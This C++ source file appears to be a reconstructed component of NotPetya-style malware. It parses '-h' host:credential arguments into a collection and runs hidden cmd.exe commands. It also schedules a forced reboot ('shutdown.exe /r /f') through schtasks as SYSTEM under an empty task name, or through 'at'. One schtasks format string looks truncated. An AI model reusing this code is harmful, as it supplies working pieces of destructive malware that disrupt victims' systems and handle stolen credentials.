#include "ZSystemCmd.h"
#include <Lmserver.h>
#include <lmerr.h>
#include <Lmapibuf.h>
#include <Shlwapi.h>

#include "ZCollectAccount.h"
#include "ZSystemCmd.h"

typedef WINBASEAPI
BOOL
(WINAPI
*PFNIsWow64Process)(
__in  HANDLE hProcess,
__out PBOOL Wow64Process
);


BOOL CheckIsWow64Process()
{
	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	PFNIsWow64Process pfnIsWow64Process = (PFNIsWow64Process)GetProcAddress(hKernel32, "IsWow64Process");

	BOOL bWow64Process = FALSE;
	if (pfnIsWow64Process)
	{
		pfnIsWow64Process(GetCurrentProcess(), &bWow64Process);
	}
	return bWow64Process;
}

BOOL InitCmdLineForAcsii(WCHAR *pData)
{
	BOOL bRet = TRUE;
	for (WCHAR *pBegin = pData + 2; *pBegin; pBegin++)
	{
		if (*pBegin == L';')
		{
			*pBegin = L' ';
		}
	}

	int nNumArgs = 0;
	WCHAR **pArgv = CommandLineToArgvW(pData, &nNumArgs);
	if (NULL != pArgv)
	{
		for (int i = 0; i < nNumArgs; i++)
		{
			if (wcslen(pArgv[i]) <= 16)
			{
				bRet = g_pObj1->AddString(pArgv[i], 0);
			}
		}
		LocalFree(pArgv);
	}

	return bRet;
}


int InitCmdLine(LPCWSTR lpCmdLine)
{
	LPWSTR *pRet = NULL;
	try
	{
		if (NULL == lpCmdLine)
		{
			throw 0;
		}

		if (0 == wcslen(lpCmdLine))
		{
			throw 0;
		}

		int nNumArgs = 0;
		pRet = CommandLineToArgvW(lpCmdLine, &nNumArgs);
		if (NULL == pRet)
		{
			throw 0;
		}

		if (nNumArgs <= 0)
		{
			throw 0;
		}

		int nCount = StrToIntW(pRet[0]);
		int i = 0;
		for (; i < nCount; i++)
		{
			g_dwShutTime = nCount;
			if (nNumArgs <= (i + 1))
			{
				continue;
			}

			WCHAR * pArg1 = StrStrW(pRet[i + 1], L"-h");
			if (NULL == *pArg1)
			{
				break;
			}

			WCHAR *pArg2 = StrChrW(pRet[i + 1], L':');
			if (NULL != pArg2)
			{
				*pArg2 = 0;
				AddStringByTwo(pArg1, pArg2 + 1, 1);
			}
		}

		InitCmdLineForAcsii(pRet[i]);
	}
	catch (...)
	{
	}

	if (NULL != pRet)
	{
		LocalFree(pRet);
		pRet = NULL;
	}
	// 	/************************************************************************/
	// 	/*                                                                      */
	// 	/************************************************************************/
	// 
	// 	if (NULL != lpCmdLine)
	// 	{
	// 		if (0 != wcslen(lpCmdLine))
	// 		{
	// 			int nNumArgs = 0;
	// 			LPWSTR *pRet = CommandLineToArgvW(lpCmdLine, &nNumArgs);
	// 			if (NULL != pRet)
	// 			{
	// 				if (nNumArgs > 0)
	// 				{
	// 					int nCount = StrToIntW(pRet[0]);
	// 					int i = 0;
	// 					for (; i < nCount; i++)
	// 					{
	// 						g_dwShutTime = nCount;
	// 						if (nNumArgs <= (i + 1))
	// 						{
	// 							continue;
	// 						}
	// 						WCHAR * pArg1 = StrStrW(pRet[i + 1], L"-h");
	// 						if (NULL == *pArg1)
	// 						{
	// 							break;
	// 						}
	// 
	// 						WCHAR *pArg2 = StrChrW(pRet[i + 1], L':');
	// 						if (NULL != pArg2)
	// 						{
	// 							*pArg2 = 0;
	// 							AddStringByTwo(pArg1, pArg2 + 1, 1);
	// 						}
	// 					}
	// 
	// 					InitCmdLineForAcsii(pRet[i]);
	// 					LocalFree(pRet);
	// 				}
	// 			}
	// 		}
	// 	}

	if (0 == g_dwShutTime)
	{
		g_dwShutTime = 60;
	}
	return 0;
}


BOOL CheckSystemSupport()
{
	BOOL bRet = FALSE;
	OSVERSIONINFOW osVersion;
	memset(&osVersion, 0, sizeof(OSVERSIONINFOW));
	if (GetVersionExW(&osVersion))
	{
		if (osVersion.dwMajorVersion > 5)
		{
			bRet = TRUE;
		}
	}
	return bRet;
}


BOOL RunCmd(WCHAR *pCmd, DWORD dwSleep)
{
	WCHAR szCommandLine[1024] = { 0 };
	WCHAR szEnvironmentPath[780] = { 0 };
	PROCESS_INFORMATION tagProcessInfo;
	STARTUPINFOW tagStartInfo;
	BOOL bRet = FALSE;

	wsprintfW(szCommandLine, L"/c %ws", pCmd);
	pCmd[1023] = 0;
	if (0 == GetEnvironmentVariableW(L"ComSpec", szEnvironmentPath, 780))
	{
		if (GetSystemDirectoryW(szEnvironmentPath, 780))
		{
			if (NULL == lstrcatW(szEnvironmentPath, L"\\cmd.exe"))
			{
				return bRet;
			}
		}
		else
		{
			return bRet;
		}
	}

	memset(&tagProcessInfo, 0, sizeof(PROCESS_INFORMATION));
	memset(&tagStartInfo, 0, sizeof(STARTUPINFOW));
	bRet = CreateProcessW(szEnvironmentPath, szCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &tagStartInfo, &tagProcessInfo);
	if (bRet)
	{
		Sleep(dwSleep * 1000);
	}
	return bRet;
}


DWORD GetRunTime()
{
	DWORD dwTime = (GetTickCount() - g_dwBeginTickCount) / 60 / 1000;
	return dwTime < g_dwShutTime ? g_dwShutTime - dwTime : 0;
}

BOOL Shutdown()
{
	BOOL bRet = FALSE;
	WCHAR szCommand[1024] = { 0 };
	WCHAR szSystemDirectory[780] = { 0 };
	SYSTEMTIME SystemTime;
	GetLocalTime(&SystemTime);
	DWORD dwRunTime = GetRunTime();
	if (dwRunTime < 10)
	{
		dwRunTime = 10;
	}

	DWORD dwHours = (dwRunTime + 3) / 60;
	DWORD dwMinute = (dwRunTime + 3) % 60;
	dwHours = (dwHours + SystemTime.wHour) % 24;
	dwMinute += SystemTime.wMinute;

	if (0 != GetSystemDirectoryW(szSystemDirectory, 780))
	{
		if (PathAppendW(szSystemDirectory, L"shutdown.exe /r /f"))
		{
			if (CheckSystemSupport())
			{
				WCHAR *pRunUserName = L"/RU \"SYSTEM\" ";
				if (g_btCurPrivilege & 4)
				{
					pRunUserName = L"";
				}
				wsprintfW(szCommand, L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%0", pRunUserName, szSystemDirectory, dwHours, dwMinute);
			}
			else
			{
				wsprintfW(szCommand, L"at %02d:%02d %ws", dwHours, dwMinute, szSystemDirectory);
			}

			bRet = RunCmd(szCommand, 0);
		}
	}
	return bRet;
}